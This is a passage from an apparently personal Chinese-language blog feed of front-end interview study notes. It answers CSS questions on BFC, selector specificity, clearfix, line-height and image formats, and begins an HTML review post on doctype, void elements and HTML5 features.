CSS里的visibility属性有个collapse属性值是干嘛用的？在不同浏览器下以后什么区别？</p></blockquote></li></ol><p>对于普通元素visibility:collapse;会将元素完全隐藏,不占据页面布局空间,与<code>display:none;</code>表现相同. 如果目标元素为<code>table</code>,<code>visibility:collapse</code>;将 <code>table</code> 隐藏,但是会占据页面布局空间. 仅在Firefox下起作用,IE会显示元素,Chrome会将元素隐藏,但是占据空间.</p><blockquote><p>十八、position跟display、margin collapse、overflow、float这些特性相互叠加后会怎么样？</p></blockquote><p>如果元素的 <code>display:none</code>,那么元素不被渲染, <code>position</code>,<code>float</code> 不起作用;<br>如果元素拥有<code>position:absolute</code>;或者<code>position:fixed</code>;属性那么元素将为绝对定位,<code>float</code> 不起作用;<br>如果元素 <code>float</code> 属性不是 <code>none</code>,元素会脱离文档流,根据 <code>float</code> 属性值来显示.有浮动,绝对定位,<code>inline-block</code>属性的元素,<code>margin</code> 不会和垂直方向上的其他元素 <code>margin</code> 折叠.</p><blockquote><p>（方方）十九、 对BFC规范(块级格式化上下文：block formatting context)的理解？</p></blockquote><p>（W3C CSS 2.1 规范中的一个概念,它是一个独立容器，决定了元素如何对其内容进行定位,以及与其他元素的关系和相互作用。）<br>一个页面是由很多个 Box 组成的,元素的类型和 <code>display</code> 属性,决定了这个 <code>Box</code> 的类型。<br>不同类型的 <code>Box</code>,会参与不同的 Formatting Context（决定如何渲染文档的容器）,因此Box内的元素会以不同的方式渲染,也就是说BFC内部的元素和外部的元素不会互相影响。</p><p>overflow:hidden 清除浮动。（方方总是用 .clearfix 清除浮动，坚决不用 overflow:hidden 清除浮动）<br>overflow:hidden 取消父子 margin 合并。<a href="http://jsbin.com/conulod/1/edit?html,css,js,output" target="_blank" rel="external">举例</a>（方方用 padding-top: 1px;）</p><blockquote><p>二十、css定义的权重</p></blockquote><p>以下是权重的规则：标签的权重为1，class的权重为10，id的权重为100，<br>如果权重相同，则最后定义的样式会起作用，但是应该避免这种情况出现<br>以下例子是演示各种定义的权重值：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/*权重为1*/</span></div><div class="line"> <span class="selector-tag">div</span>&#123;</div><div class="line"> &#125;</div><div class="line"> <span class="comment">/*权重为10*/</span></div><div class="line"> <span class="selector-class">.class1</span>&#123;</div><div class="line"> &#125;</div><div class="line"> <span class="comment">/*权重为100*/</span></div><div class="line"> <span class="selector-id">#id1</span>&#123;</div><div class="line"> &#125;</div><div class="line"> <span class="comment">/*权重为100+1=101*/</span></div><div class="line"> <span class="selector-id">#id1</span> <span class="selector-tag">div</span>&#123;</div><div class="line"> &#125;</div><div class="line"> <span class="comment">/*权重为10+1=11*/</span></div><div class="line"> <span class="selector-class">.class1</span> <span class="selector-tag">div</span>&#123;</div><div class="line"> &#125;</div><div class="line"> <span class="comment">/*权重为10+10+1=21*/</span></div><div class="line"> <span class="selector-class">.class1</span> <span class="selector-class">.class2</span> <span class="selector-tag">div</span>&#123;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p><blockquote><p>二十一：请解释一下为什么需要清除浮动？清除浮动的方式</p></blockquote><p>清除浮动是为了清除使用浮动元素产生的影响。浮动的元素，高度会塌陷，而高度的塌陷使我们页面后面的布局不能正常显示。<br>（1）、父级div定义height；<br>（2）、父级div 也一起浮动；<br>（3）、常规的使用一个class；<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.clearfix</span>::before, <span class="selector-class">.clearfix</span>::after &#123;</div><div class="line">    <span class="attribute">content</span>: <span class="string">" "</span>;</div><div class="line">    <span class="attribute">display</span>: table;</div><div class="line">&#125;</div><div class="line"><span class="selector-class">.clearfix</span>::after &#123;</div><div class="line">    <span class="attribute">clear</span>: both;</div><div class="line">&#125;</div><div class="line"><span class="selector-class">.clearfix</span> &#123;</div><div class="line">    *zoom: <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>（4）、SASS编译的时候，浮动元素的父级div定义伪类:after<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&amp;<span class="selector-pseudo">::after</span>,&amp;<span class="selector-pseudo">::before</span>&#123;</div><div class="line">    <span class="attribute">content</span>: <span class="string">" "</span>;</div><div class="line">     <span class="attribute">visibility</span>: hidden;</div><div class="line">     <span class="attribute">display</span>: block;</div><div class="line">     <span class="attribute">height</span>: <span class="number">0</span>;</div><div class="line">     <span class="attribute">clear</span>: both;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>解析原理：<br>1) <code>display:block</code> 使生成的元素以块级元素显示,占满剩余空间;<br>2) <code>height:0</code> 避免生成内容破坏原有布局的高度。<br>3) <code>visibility:hidden</code> 使生成的内容不可见，并允许可能被生成内容盖住的内容可以进行点击和交互;<br>4）通过 <code>content:&quot;.&quot;</code>生成内容作为最后一个元素，至于content里面是点还是其他都是可以的，例如oocss里面就有经典的 content:”.”,有些版本可能content 里面内容为空,一丝冰凉是不推荐这样做的,firefox直到7.0 content:”” 仍然会产生额外的空隙；<br>5）<code>zoom：1</code> 触发IE hasLayout。</p><p>通过分析发现，除了<code>clear：both</code>用来闭合浮动的，其他代码无非都是为了隐藏掉content生成的内容，这也就是其他版本的闭合浮动为什么会有<code>font-size：0，line-height：0。</code></p><blockquote><p>二十二、什么是外边距合并？</p></blockquote><p>外边距合并指的是，当两个垂直外边距相遇时，它们将形成一个外边距。<br>合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者。<br><a href="http://www.w3school.com.cn/css/css_margin_collapsing.asp" target="_blank" rel="external">w3school介绍</a></p><blockquote><p>二十三、zoom:1的清除浮动原理?</p></blockquote><p>清除浮动，触发hasLayout；<br>Zoom属性是IE浏览器的专有属性，它可以设置或检索对象的缩放比例。解决ie下比较奇葩的bug。<br>譬如外边距（margin）的重叠，浮动清除，触发ie的haslayout属性等。</p><p>来龙去脉大概如下：<br>当设置了zoom的值之后，所设置的元素就会就会扩大或者缩小，高度宽度就会重新计算了，这里一旦改变zoom值时其实也会发生重新渲染，运用这个原理，也就解决了ie下子元素浮动时候父元素不随着自动扩大的问题。</p><p>Zoom属是IE浏览器的专有属性，火狐和老版本的webkit核心的浏览器都不支持这个属性。然而，zoom现在已经被逐步标准化，出现在 CSS 3.0 规范草案中。</p><p>目前非ie由于不支持这个属性，它们又是通过什么属性来实现元素的缩放呢？<br>可以通过css3里面的动画属性scale进行缩放。</p><blockquote><p>二十四、移动端的布局用过媒体查询吗？</p></blockquote><p>假设你现在正用一台显示设备来阅读这篇文章，同时你也想把它投影到屏幕上，或者打印出来， 而显示设备、屏幕投影和打印等这些媒介都有自己的特点，CSS就是为文档提供在不同媒介上展示的适配方法</p><p>当媒体查询为真时，相关的样式表或样式规则会按照正常的级联规被应用。 当媒体查询返回假， 标签上带有媒体查询的样式表 仍将被下载 （只不过不会被应用）。</p><p>包含了一个媒体类型和至少一个使用 宽度、高度和颜色等媒体属性来限制样式表范围的表达式。 CSS3加入的媒体查询使得无需修改内容便可以使样式应用于某些特定的设备范围。</p><p><code>&lt;style&gt; @media (min-width: 700px) and (orientation: landscape){ .sidebar { display: none; } } &lt;/style&gt;</code></p><blockquote><p>二十五、使用 CSS 预处理器吗？喜欢那个？</p></blockquote><p>SASS (SASS、LESS没有本质区别，只因为团队前端都是用的SASS)</p><blockquote><p>二十六、CSS优化、提高性能的方法有哪些？</p></blockquote><p>关键选择器（key selector）。选择器的最后面的部分为关键选择器（即用来匹配目标元素的部分）；<br>如果规则拥有 ID 选择器作为其关键选择器，则不要为规则增加标签。过滤掉无关的规则（这样样式系统就不会浪费时间去匹配它们了）；<br>提取项目的通用公有样式，增强可复用性，按模块编写组件；增强项目的协同开发性、可维护性和可扩展性;<br>使用预处理工具或构建工具（gulp对css进行语法检查、自动补前缀、打包压缩、自动优雅降级）</p><blockquote><p>二十七、浏览器是怎样解析CSS选择器的？</p></blockquote><p>样式系统从关键选择器开始匹配，然后左移查找规则选择器的祖先元素。<br>只要选择器的子树一直在工作，样式系统就会持续左移，直到和规则匹配，或者是因为不匹配而放弃该规则。</p><blockquote><p>二十八、margin和padding分别适合什么场景使用？</p></blockquote><p><code>margin</code> 是用来隔开元素与元素的间距；<code>padding</code> 是用来隔开元素与内容的间隔。<br><code>margin</code> 用于布局分开元素使元素与元素互不相干；<br><code>padding</code> 用于元素与内容之间的间隔，让内容（文字）与（包裹）元素之间有一段</p><blockquote><p>二十九、::before 和 :after中双冒号和单冒号 有什么区别？解释一下这2个伪元素的作用。</p></blockquote><p>单冒号<code>(:)</code>用于CSS3伪类，双冒号<code>(::)</code>用于CSS3伪元素。（伪元素由双冒号和伪元素名称组成）<br>双冒号是在当前规范中引入的，用于区分伪类和伪元素。不过浏览器需要同时支持旧的已经存在的伪元素写法，<br>比如:<code>first-line</code>、<code>:first-letter</code>、<code>:before</code>、<code>:after</code>等，<br>而新的在CSS3中引入的伪元素则不允许再支持旧的单冒号的写法。</p><p>想让插入的内容出现在其它内容前，使用<code>::before</code>，否者，使用<code>::after</code>；<br>在代码顺序上，<code>::after</code>生成的内容也比<code>::before</code>生成的内容靠后。<br>如果按堆栈视角，<code>::after</code>生成的内容会在<code>::before</code>生成的内容之上</p><blockquote><p>三十、如何修改chrome记住密码后自动填充表单的黄色背景 ？</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">input</span><span class="selector-pseudo">:-webkit-autofill</span>, <span class="selector-tag">textarea</span><span class="selector-pseudo">:-webkit-autofill</span>, <span class="selector-tag">select</span><span class="selector-pseudo">:-webkit-autofill</span>&#123;</div><div class="line">   <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(250, 255, 189); <span class="comment">/* #FAFFBD; */</span></div><div class="line">   <span class="attribute">background-image</span>: none;</div><div class="line">   <span class="attribute">color</span>: <span class="built_in">rgb</span>(0, 0, 0);</div><div class="line">&#125;</div></pre></td></tr></table></figure><blockquote><p>三十一、设置元素浮动后，该元素的display值是多少？</p></blockquote><p>自动变成了 <code>display:block</code></p><blockquote><p>三十二、怎么让Chrome支持小于12px 的文字？</p></blockquote><p>（1）、用图片：如果是内容固定不变情况下，使用将小于12px文字内容切出做图片，这样不影响兼容也不影响美观。<br>（2）、使用12px及12px以上字体大小：为了兼容各大主流浏览器，建议设计美工图时候设置大于或等于12px的字体大小，如果是接单的这个时候就需要给客户讲解小于12px浏览器不兼容等事宜。<br>（3）、继续使用小于12px字体大小样式设置：如果不考虑chrome可以不用考虑兼容，同时在设置小于12px对象设置<code>-webkit-text-size-adjust:none，</code>做到最大兼容考虑。<br>（4）、使用12px以上字体：为了兼容、为了代码更简单 从新考虑权重下兼容性。</p><blockquote><p>三十三、让页面里的字体变清晰，变细用CSS怎么做？</p></blockquote><p><code>-webkit-font-smoothing: antialiased;</code></p><blockquote><p>三十四、font-style属性可以让它赋值为“oblique” oblique是什么意思？</p></blockquote><p>倾斜的字体样式</p><blockquote><p>三十五、position:fixed;在android下无效怎么处理？</p></blockquote><p><code>fixed</code>的元素是相对整个页面固定位置的，你在屏幕上滑动只是在移动这个所谓的<code>viewport</code>，<br>原来的网页还好好的在那，fixed的内容也没有变过位置，<br>所以说并不是iOS不支持fixed，只是fixed的元素不是相对手机屏幕固定的。<br><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no&quot;/&gt;</code></p><blockquote><p>三十六、如果需要手动写动画，你认为最小时间间隔是多久，为什么？（阿里）</p></blockquote><p>多数显示器默认频率是60Hz，即1秒刷新60次，所以理论上最小间隔为1/60＊1000ms ＝ 16.7ms</p><blockquote><p>三十七、display:inline-block 什么时候会显示间隙？(携程)</p></blockquote><p>移除空格、使用 <code>margin</code> 负值、使用<code>font-size:0、letter-spacing、word-spacing</code></p><blockquote><p>三十八、什么是 <code>Cookie</code> 隔离？（或者说：请求资源的时候不要让它带cookie怎么做）</p></blockquote><p>如果静态文件都放在主域名下，那静态文件请求的时候都带有的 <code>cookie</code> 的数据提交给 <code>server</code> 的，非常浪费流量，<br>所以不如隔离开。</p><p>因为 <code>cookie</code> 有域的限制，因此不能跨域提交请求，故使用非主要域名的时候，请求头中就不会带有 <code>cookie</code> 数据，<br>这样可以降低请求头的大小，降低请求时间，从而达到降低整体请求延时的目的。</p><p>同时这种方式不会将 <code>cookie</code> 传入<code>Web Server</code>，也减少了<code>Web Server</code>对<code>cookie</code>的处理分析环节，<br>提高了<code>webserver</code>的<code>http</code>请求的解析速度。</p><blockquote><p>三十九、什么是CSS 预处理器 / 后处理器？</p></blockquote><p>（1）、预处理器例如：LESS、Sass、Stylus，用来预编译Sass或less，增强了css代码的复用性，<br>    还有层级、mixin、变量、循环、函数等，具有很方便的UI组件模块化开发能力，极大的提高工作效率。</p><p>（2）、后处理器例如：PostCSS，通常被视为在完成的样式表中根据CSS规范处理CSS，让其更有效；目前最常做的<br>    是给CSS属性添加浏览器私有前缀，实现跨浏览器兼容性的问题。</p><blockquote><p>四十、rem布局的优缺点</p></blockquote><p>（1）、原理是，先按定高宽设计出来页面，然后转换为rem单位，配合js查询屏幕大小来改变html的font-size，最终做出所谓的完美自适应。</p><p>（2）、rem+js是宽度自适应，无法做到高度自适应，所以那些对高度要求很高的rem+js无法实现；改变浏览器宽度，你会发现，页面所有元素的高宽都等比例缩放；也就是大屏幕下导航是横的，小屏幕下还是横的只不过变小了。</p><p>（3）、优点：理想状态是所有屏幕的高宽比和最初的设计高宽比一样，或者相差不多，完美适应。<br>缺点：碰到重视高度的设计，或者重视元素间间距的设计，那就玩不开了。</p><blockquote><p>四十一、style标签写在body后与body前有什么区别？</p></blockquote><p>（1）、写在head标签中利于浏览器逐步渲染；</p><p>（2）、写在body标签后由于浏览器以逐行方式对 <code>html</code> 文档进行解析，当解析到写在尾部的样式表（外联或写在 <code>style</code> 标签）会导致浏览器停止之前的渲染，等待加载且解析样式表完成之后重新渲染，在windows的IE下可能会出现 FOUC 现象（即样式失效导致的页面闪烁问题）</p><blockquote><p>四十二、overflow: scroll时不能平滑滚动的问题怎么处理？</p></blockquote><p>以下代码可解决这种卡顿的问题：<code>-webkit-overflow-scrolling: touch</code>;，是因为这行代码启用了硬件加速特性，所以滑动很流畅。</p><blockquote><p>有一个高度自适应的div，里面有两个div，一个高度100px，希望另一个填满剩下的高度。</p><p>四十三、png、jpg、gif 这些图片格式解释一下，分别什么时候用。有没有了解过webp？</p></blockquote><p>（1）、PNG是一种无损数据压缩位图图形文件格式。<br>优点：使用无损压缩；支持256色调色板技术以产生小体积文件<br>缺点：但也有一些软件不能使用适合的预测,而造成过分臃肿的PNG文件。</p><p>（2）、JPEG是一种针对相片影像而广泛使用的一种失真压缩标准方法。<br>优点：PEG在色调及颜色平滑变化的相片或是写实绘画（painting）上可以达到它最佳的效果。<br>缺点：它并不适合于线条绘图（drawing）和其他文字或图示（iconic）的图形,因为它的压缩方法用在这些图形的型态上,会得到不适当的结果。<br>给个活生生的例子：一张照片在Instagram反复上传下载90次之后….(在博客园找了半小时,link), 在最后jpg图片完全变样了;<br><img src="https://i.imgur.com/yJfrBZm.jpg" alt=""></p><p>（3）、GIF图形交换格式是一种位图图形文件格式,以8位色（即256种颜色）重现真彩色的图像。它实际上是一种压缩文档。<br>优点：可插入多帧,从而实现动画效果。<br>缺点：最多只能处理256种颜色（2的8次方）,故不宜应用于真彩图像。</p><p>（4）、　2010年谷歌推迟的图片格式,专门用来在web中使用, 压缩率只有jpg的2/3或者更低； 第一个版本的webp图片格式是有损的, 新版本中webp图片是无损的。<br>优点：体积小巧；<br>缺点：　兼容性不太好, 只有opera,和chrome支持;</p><blockquote><p>四十四、你对line-height是如何理解的？</p></blockquote><p>（1）、　CSS中起高度作用的应该就是height以及line-height了吧！如果一个标签没有定义height属性(包括百分比高度)，那么其最终表现的高度一定是由line-height起作用；</p><p>不是文字撑开了div的高度，而是line-height！</p><p>在inline box模型中，有个line boxes，这玩意是看不见的，这个玩意的工作就是包裹每行文字。一行文字一个line boxes。line boxes什么特性也没有，就高度。所以一个没有设置height属性的div的高度就是由一个一个line boxes的高度堆积而成的。</p><p>其实line boxes不是直接的生产者，属于中层干部，真正的活儿都是它的手下 – inline boxes干的，这些手下就是文字啦，图片啊，span之类的inline属性的标签啦。line boxes只是个考察汇报人员，考察它的手下谁的实际line-height值最高，谁最高，它就要谁的值，然后向上汇报，形成高度。</p><p>（2）、行高还有一个特性，叫做垂直居中性。line-height的最终表现是通过line boxes实现的，而无论line boxes所占据的高度是多少（无论比文字大还是比文字小），其占据的空间都是与文字内容公用水平中垂线的。还拿上面这张图来说吧。</p><p>（3）、把line-height设置为您需要的box的大小可以实现单行文字的垂直居中；</p><p>（4）、要实现高度不固定的文字垂直居中使用padding就好了。对于高度固定的div，里面文字单行或多行显示，字体大小有大有小的情况怎么办呢？方法之一就是借助于line-height；</p><p>（5）、有个很搓的办法可以实现文字间距自动适应于文字的大小，那就是使用<em>通配符： `.article_box </em>{line-height:150%;}`；就不会出现文字重叠的情况了。</p><blockquote><p>四十五、全屏滚动的原理是什么？用到了CSS的那些属性？</p></blockquote><p>（1）、原理：方法一是整体的元素一直排列下去，假设有5个需要展示的全屏页面，那么高度是500%<br>，只是展示100%，剩下的可以通过transform进行y轴定位，也可以通过 <code>margin-top</code> 实现</p><p>（2）、<code>overflow：hidden；``transition：all 1000ms ease；</code></p><blockquote><p>四十六、什么是响应式设计？响应式设计的基本原理是什么？如何兼容低版本的IE？</p></blockquote><p>（1）、响应式网站设计的理念是：集中创建页面的图片排版大小，可以智能地根据用户行为以及使用的设备环境（系统平台、屏幕尺寸、屏幕定向等）进行相对应的布局。</p><p>（2）、基本原理: 媒体查询 @media</p><p>（3）、兼容IE可以使用JS辅助一下来解决</p><blockquote><p>四十七、元素竖向的百分比设定是相对于容器的高度吗？</p></blockquote><p>不是，是容器宽度。</p><blockquote><p>四十八、视差滚动效果，如何给每页做不同的动画？（回到顶部，向下滑动要再次出现，和只出现一次分别怎么做？）</p></blockquote><p>视差滚动就是这样的效果之一。这种技术通过在网页向下滚动的时候，控 制背景的移动速度比前景的移动速度慢来创建出令人惊叹的3D效果。<br>（1）、CSS3实现<br>优点：开发时间短、性能和开发效率比较好，缺点是不能兼容到低版本的浏览器</p><p>（2）、jquery实现<br>通过控制不同层滚动速度，计算每一层的时间，控制滚动效果。<br>优点：能兼容到各个版本的，效果可控性好<br>缺点：开发起来对制作者要求高</p><p>（3）、插件实现方式<br>例如：parallax-scrolling，兼容性十分好</p><blockquote><p>四十九、抽离样式模块怎么写，说出思路，有无实践经验？[阿里航旅的面试题]</p></blockquote><p>先看视觉稿，把可复用的组件找出来。然后把命名和结构确定下来。<br><a href="https://github.com/jayli/jayli.github.com/issues/16" target="_blank" rel="external">航旅无线前端团队必备技能</a></p><blockquote><p>五十、在网页中的应该使用奇数还是偶数的字体？为什么呢？</p></blockquote><p>（1）、偶数字号相对更容易和 web 设计的其他部分构成比例关系。比如：当我用了 14 px 的正文字号，我可能会在一些地方用 14 × 0.5 = 7 px 的 margin，在另一些地方用 14 × 1.5 = 21 px 的标题字号。</p><p>（2）、Windows 自带的点阵宋体（中易宋体）从 Vista 开始只提供 12、14、16 px 这三个大小的点阵，而 13、15、17 px 时用的是小一号的点阵（即每个字占的空间大了 1 px，但点阵没变），于是略显稀疏。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;（方方-必考）一、介绍一下标准的CSS的盒子模型？低版本IE的盒子模型有什么不同的？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;（1）、有两种， IE 盒子模型、W3C 盒子模型；&lt;br&gt;（2）、盒模型： 内容(content)、填充(padding)、边界(margin)、 边框(border)；&lt;br&gt;（3）、区  别： IE的content部分把 border 和 padding计算了进去;&lt;br&gt;（4）、content-box: width == 内容区宽度&lt;br&gt;（5）、border-box: width == 内容区宽度 + padding 宽度 + border 宽度&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;二、CSS选择符有哪些？哪些属性可以继承？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;1.id选择器（ &lt;code&gt;#myid&lt;/code&gt; ）&lt;br&gt;2.类选择器（ &lt;code&gt;.myclassname&lt;/code&gt; ）&lt;br&gt;3.标签选择器（ &lt;code&gt;div, h1, p&lt;/code&gt;）&lt;br&gt;4.相邻选择器（&lt;code&gt;h1 + p&lt;/code&gt; ）&lt;br&gt;5.子选择器（ &lt;code&gt;ul &amp;gt; li&lt;/code&gt; ）&lt;br&gt;6.后代选择器（ &lt;code&gt;li a&lt;/code&gt; ）&lt;br&gt;7.通配符选择器（ &lt;code&gt;*&lt;/code&gt; ）&lt;br&gt;8.属性选择器（ &lt;code&gt;a[rel = &amp;quot;external&amp;quot;]&lt;/code&gt; ）&lt;br&gt;9.伪类选择器（ &lt;code&gt;a:hover, li:nth-child&lt;/code&gt; ）&lt;/p&gt;
&lt;p&gt;可继承的样式： &lt;code&gt;font-size font-family color, UL LI DL DD DT&lt;/code&gt;;&lt;/p&gt;
&lt;p&gt;不可继承的样式：&lt;code&gt;border padding margin width height&lt;/code&gt;;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>HTML 查漏补缺</title>
    <link href="wangsiyuan233.github.io/2018/07/02/57HTML-%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA/"/>
    <id>wangsiyuan233.github.io/2018/07/02/57HTML-查漏补缺/</id>
    <published>2018-07-03T03:02:51.000Z</published>
    <updated>2018-07-04T17:22:50.504Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一、Doctype作用？标准模式与兼容模式各有什么区别?</p></blockquote><p>（1）、<code>&lt;!DOCTYPE&gt;</code>声明位于 <code>HTML</code> 文档中的第一行，处于<code>&lt;html&gt;</code> 标签之前。告知浏览器的解析器用什么文档标准解析这个文档。 <code>DOCTYPE</code> 不存在或格式不正确会导致文档以兼容模式呈现。</p><p>（2）、标准模式的排版 和JS运作模式都是以该浏览器支持的最高标准运行。在兼容模式中，页面以宽松的向后兼容的方式显示,模拟老式浏览器的行为以防止站点无法工作。</p><a id="more"></a><blockquote><p>二、 HTML5 为什么只需要写 <code>&lt;!DOCTYPE HTML&gt;</code>？</p></blockquote><p>（1）、<code>HTML5</code> 不基于 <code>SGML</code>，因此不需要对 <code>DTD</code> 进行引用，但是需要 <code>doctype</code> 来规范浏览器的行为（让浏览器按照它们应该的方式来运行）；</p><p>（2）、而 <code>HTML4.01</code> 基于 <code>SGML</code> ,所以需要对 <code>DTD</code> 进行引用，才能告知浏览器文档所使用的文档类型。</p><blockquote><p> 三、行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？</p></blockquote><p>首先：CSS规范规定，每个元素都有 <code>display</code> 属性，确定该元素的类型，每个元素都有默认的 <code>display</code> 值，如 <code>div</code> 的 <code>display</code> 默认值为<code>“block”</code>，则为“块级”元素；<code>span</code> 默认 <code>display</code> 属性值为<code>“inline”</code>，是“行内”元素。<br>（1）、行内元素有：<code>a b span img input select strong（强调的语气）</code><br>（2）、块级元素有：<code>div ul ol li dl dt dd h1 h2 h3 h4 p</code><br>（3）、常见的空元素：<br>      <code>&lt;br&gt; &lt;hr&gt; &lt;img&gt; &lt;input&gt; &lt;link&gt; &lt;meta&gt;</code><br>      鲜为人知的是：<br>      <code>&lt;area&gt; &lt;base&gt; &lt;col&gt; &lt;command&gt; &lt;embed&gt; &lt;keygen&gt; &lt;param&gt; &lt;source&gt; &lt;track&gt; &lt;wbr&gt;</code></p><blockquote><p> 四、页面导入样式时，使用link和@import有什么区别？</p></blockquote><p>（1）、 <code>link</code> 属于 <code>XHTML</code> 标签，除了加载 <code>CSS</code> 外，还能用于定义 <code>RSS</code>, 定义 <code>rel</code> 连接属性等作用；而 <code>@import</code> 是 <code>CSS</code> 提供的，只能用于加载 <code>CSS</code>;</p><p>（2）、页面被加载的时，<code>link</code> 会同时被加载，而 <code>@import</code> 引用的 <code>CSS</code> 会等到页面被加载完再加载;</p><p>（3）、<code>import</code>是<code>CSS2.1</code> 提出的，只在 <code>IE5</code> 以上才能被识别，而 <code>link</code> 是 <code>XHTML</code> 标签，无兼容问题;</p><p>（4）、<code>link</code> 支持使用 js 控制 <code>DOM</code> 去改变样式，而<code>@import</code>不支持;</p><blockquote><p> 五、介绍一下你对浏览器内核的理解？</p></blockquote><p>主要分成两部分：渲染引擎(layout engineer或Rendering Engine)和JS引擎。</p><p>（1）、渲染引擎：负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入CSS等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器的内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核。</p><p>（2）、JS引擎：解析和执行javascript来实现网页的动态效果。</p><p>最开始渲染引擎和JS引擎并没有区分的很明确，后来JS引擎越来越独立，内核就倾向于只指渲染引擎。</p><blockquote><p>六、常见的浏览器内核有哪些？</p></blockquote><p> Trident内核：IE,MaxThon,TT,The World,360,搜狗浏览器等。[又称MSHTML]<br> Gecko内核：Netscape6及以上版本，FF,MozillaSuite/SeaMonkey等<br> Presto内核：Opera7及以上。      [Opera内核原为：Presto，现为：Blink;]<br> Webkit内核：Safari,Chrome等。   [ Chrome的：Blink（WebKit的分支）]</p><p>详细文章：<a href="http://www.cnblogs.com/fullhouse/archive/2011/12/19/2293455.html" target="_blank" rel="external">浏览器内核的解析和对比</a></p><blockquote><p>七、html5有哪些新特性、移除了那些元素？如何处理HTML5新标签的浏览器兼容问题？如何区分 HTML 和 HTML5？</p></blockquote><p>（1）、<code>HTML5</code> 现在已经不是 <code>SGML</code> 的子集，主要是关于图像，位置，存储，多任务等功能的增加。<br>绘画 <code>canvas</code>;<br>用于媒介回放的 <code>video</code> 和 <code>audio</code> 元素;<br>本地离线存储 <code>localStorage</code> 长期存储数据，浏览器关闭后数据不丢失;<br><code>sessionStorage</code> 的数据在浏览器关闭后自动删除;<br>语义化更好的内容元素，比如 <code>article、footer、header、nav、section</code>;<br>表单控件，<code>calendar、date、time、email、url、search</code>;<br>新的技术 <code>webworker, websocket, Geolocation</code>;</p><p>（2）、移除的元素：<br>纯表现的元素：<code>basefont，big，center，font, s，strike，tt，u</code>;<br>对可用性产生负面影响的元素：<code>frame，frameset，noframes</code>；</p><p>（3）、支持<code>HTML5</code>新标签：<br><code>IE8/IE7/IE6</code>支持通过<code>document.createElement</code>方法产生的标签，<br>可以利用这一特性让这些浏览器支持 <code>HTML5</code> 新标签，<br>浏览器支持新标签后，还需要添加标签默认的样式。<br>当然也可以直接使用成熟的框架、比如<code>html5shim</code>;<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if lt IE 9]&gt;</span></div><div class="line">&lt;script&gt; src="http://html5shim.googlecode.com/svn/trunk/html5.js"&lt;/script&gt;</div><div class="line">&lt;![endif]--&gt;</div></pre></td></tr></table></figure></p><p>（4）、如何区分 <code>HTML5</code>： <code>DOCTYPE</code>声明\新增的结构元素\功能元素</p><blockquote><p>（方方-必考）八、简述一下你对HTML语义化的理解？</p></blockquote><p>用正确的标签做正确的事情。<br><code>html</code> 语义化让页面的内容结构化，结构更清晰，便于对浏览器、搜索引擎解析;<br>即使在没有样式 <code>CSS</code> 情况下也以一种文档格式显示，并且是容易阅读的;<br>搜索引擎的爬虫也依赖于 <code>HTML</code> 标记来确定上下文和各个关键字的权重，利于 <code>SEO</code>;<br>使阅读源代码的人对网站更容易将网站分块，便于阅读维护理解。</p><blockquote><p>九、HTML5的离线储存怎么使用，工作原理能不能解释一下？</p></blockquote><p>在用户没有与因特网连接时，可以正常访问站点或应用，在用户与因特网连接时，更新用户机器上的缓存文件。<br>  原理：<code>HTML5</code> 的离线存储是基于一个新建的<code>.appcache</code>文件的缓存机制(不是存储技术)，通过这个文件上的解析清单离线存储资源，这些资源就会像 <code>cookie</code> 一样被存储了下来。之后当网络在处于离线状态下时，浏览器会通过被离线存储的数据进行页面展示。</p><p>如何使用：<br>（1）、页面头部像下面一样加入一个 <code>manifest</code> 的属性；<br>（2）、在 <code>cache.manifest</code> 文件的编写离线存储的资源；<br>      <code>CACHE MANIFEST</code><br>      <code>#v0.11</code><br>      <code>CACHE:</code><br>      <code>js/app.js</code><br>      <code>css/style.css</code><br>      <code>NETWORK:</code><br>      <code>resourse/logo.png</code><br>      <code>FALLBACK:</code><br>      <code>/ /offline.html</code><br>（3）、在离线状态时，操作 <code>window.applicationCache</code> 进行需求实现。<br><a href="https://yanhaijing.com/html/2014/12/28/html5-manifest/" target="_blank" rel="external">HTML5 离线缓存-manifest简介</a><br><a href="https://segmentfault.com/a/1190000000732617" target="_blank" 